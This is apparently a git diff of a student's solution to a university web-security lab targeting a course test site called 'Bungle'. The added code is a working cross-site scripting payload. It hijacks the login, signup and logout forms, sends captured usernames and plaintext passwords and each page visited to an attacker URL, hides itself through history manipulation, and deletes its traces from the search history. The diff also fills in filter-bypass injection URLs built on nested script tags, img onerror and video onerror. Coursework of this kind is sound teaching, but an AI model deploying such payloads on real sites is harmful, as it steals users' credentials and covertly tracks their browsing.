@@ -54,6 +54,202 @@ Then just add spying code and hide your suspicious URLs.
 
 // Inject this XSS payload. 
 function payload(attacker) {
+    var currentTitle;
+    var currentPage;
+
+    var currentUser = "";
+
+    function log(data) {
+        console.log($.param(data));
+        $.get(attacker, data);
+    }
+
+    function updateCurrentPage(newHtml, newTitle, newPage) {
+        $("body").html(newHtml);
+        currentTitle = newTitle;
+        currentPage = newPage;
+        var stateDict = {
+            "html": $("body").html(),
+            "title": currentTitle,
+            "page": currentPage
+        };
+        window.history.replaceState(stateDict, currentTitle, currentPage);
+        $("title")[0].text = currentTitle;
+
+        injectIntoPage();
+        logPage();
+    }
+
+    function updateHistory() {
+        var stateDict = {
+            "html": $("body").html(),
+            "title": currentTitle,
+            "page": currentPage
+        }
+        window.history.pushState(stateDict, currentTitle, currentPage);
+    }
+    
+    function injectIntoPage() {
+        /** login form **/
+        var loginButton = $("#log-in-btn");
+        var createAccountButton = $("#new-account-btn");
+
+        var usernameField = $("#username")[0];
+        var userpassField = $("#userpass")[0];
+
+        $(".form-inline").attr("onsubmit", "return false");
+
+        /* login button */
+        if (loginButton) {
+            loginButton.click(function() {
+                if (usernameField.value && usernameField.value) {
+                    console.log("attempt login");
+
+                    $.post(
+                        "./login",
+                        {
+                            username: usernameField.value,
+                            password: userpassField.value
+                        }
+                    )
+                    .done(function(data) {
+                        currentUser = usernameField.value
+                        log({event: "login", user: currentUser, pass: userpassField.value});
+                        updateHistory();
+                        updateCurrentPage(data, "Bungle!", "./");
+                        return false;
+                    })
+                    .fail(function (jqXHR, textStatus, error) {
+                        updateHistory();
+                        textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
+                        var newTitle = textStatus + ": " + jqXHR.status + " " + error;
+                        updateCurrentPage(jqXHR.responseText, newTitle, "./login");
+                        return false;
+                    });
+                }
+            });
+        }
+
+        /* create account button */
+        if (createAccountButton) {
+            createAccountButton.click(function() {
+                if (usernameField.value && usernameField.value) {
+                    console.log("create login");
+
+                    $.post(
+                        "./create",
+                        {
+                            username: usernameField.value,
+                            password: userpassField.value
+                        }
+                    )
+                    .done(function(data) {
+                        currentUser = usernameField.value
+                        log({event: "login", user: currentUser, pass: userpassField.value});
+                        updateHistory();
+                        updateCurrentPage(data, "Bungle!", "./");
+                        return false;
+                    })
+                    .fail(function (jqXHR, textStatus, error) {
+                        updateHistory();
+                        textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
+                        var newTitle = textStatus + ": " + jqXHR.status + " " + error;
+                        updateCurrentPage(jqXHR.responseText, newTitle, "./create");
+                        return false;
+                    });
+                }
+            });
+        }
+
+        /* logout button */
+        var logoutButton = $("#log-out-btn");
+        if (logoutButton) {
+            logoutButton.click(function() {
+                $.post("./logout")
+                .done(function(data) {
+                    log({event: "logout", user: currentUser});
+                    currentUser = ""
+                    updateHistory();
+                    updateCurrentPage(data, "Bungle!", "./");
+                    return false;
+                })
+                .fail(function (jqXHR, textStatus, error) {
+                    updateHistory();
+                    var newTitle = textStatus + ": " + jqXHR.status + " " + error;
+                    updateCurrentPage(jqXHR.responseText, newTitle, "./logout");
+                    return false;
+                });
+            });
+            logoutButton.attr("onsubmit", "return false");
+        }
+
+        /* bungle button */
+        var bungleLink = $("#bungle-lnk");
+        if (bungleLink) {
+            bungleLink.removeAttr("href");
+            bungleLink.click(function() {
+                $.get("./")
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Bungle!", "./");
+                    return false;
+                });
+            });
+        }
+
+        /* search button */
+        var searchButton = $("#search-btn");
+        var queryField = $("#query")[0];
+        if (searchButton) {
+            searchButton.click(function() {
+                var urlS = "./search?q=" + queryField.value;
+                $.get(urlS)
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Search Results", urlS);
+                    return false;
+                });
+            });
+            searchButton.attr("onsubmit", "return false");
+        }
+
+        /* search again button */
+        var searchAgainButton = $("#search-again-btn");
+        if (searchAgainButton) {
+            searchAgainButton.removeAttr("href");
+            searchAgainButton.click(function() {
+                $.get("./")
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Bungle!", "./");
+                    return false;
+                });
+            });
+        }
+
+        /* search history */
+        $(".history-item").removeAttr("href");
+        $.each($(".history-item"), function() {
+            $(this).click(function() {
+                var urlS = "./search?q=" + this.text;
+                $.get(urlS)
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Search Results", urlS);
+                    return false;
+                });
+            });
+            console.log(this.text);
+            if (this.text.includes("payload(attacker)") || this.text.includes("fromCharCode(102")) {
+                this.remove();
+            }
+        });
+    }
+
+    function logPage() {
+        var path = window.location.href;
+        log({event: "nav", user: currentUser, url: path});
+    }
 
     // This function can make it appear that a new page has been loaded
     // Note that you can proxy the main page, or a search page!
@@ -69,6 +265,7 @@ function payload(attacker) {
                 $('html').show();
 
                 // TODO implement spying while being stealthy and persistent. Remove the alert.
+                updateCurrentPage($('html'),"Bungle","./");
                 alert("Notice that although we injected code into the search page, you see here the main page!")
 
             });
@@ -91,7 +288,7 @@ function makeLink(target, attacker, defense) {
              * %3E = '>'
              * %22 = '"'
              * %3Cscript%3Ewindow.onload=function(){document.getElementsByTagName(%22a%22)[0].href=%22http://ece.illinois.edu/%22;}%3C/script%3E"
-             *
+             * 
              */
             return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=%3Cscript%3Ewindow.onload=function(){document.getElementsByTagName(%22a%22)[0].href=%22http://ece.illinois.edu/%22;}%3C/script%3E";
         case 2:
@@ -105,13 +302,18 @@ function makeLink(target, attacker, defense) {
                 );
         case 3:
             // TODO: generate XSS URL for defense level 2.2.3.3
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + encodeURIComponent(
+                    "<scrscriptipt>" +
+                    payload_string + 
+                    ";payload();" + 
+                    "</scrscriptipt" + ">"
+                );
         case 4:
             // TODO: generate XSS URL payload for defense level 2.2.3.4
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + encodeURIComponent("<img src=x onerror=\"" + payload_string + "payload(\"" + attacker + "\");\">");
         case 5:
             // TODO: generate XSS URL payload for defense level 2.2.3.5
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+         return target + "/search?xssdefense=" + (defense-2) + "&q=" + encodeURIComponent("<video src=x onerror=\'" + payload_string + ";payload(\"" + attacker + "\");\'>");
         case 6:
             // TODO: generate XSS URL payload for defense level 2.2.3.6
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
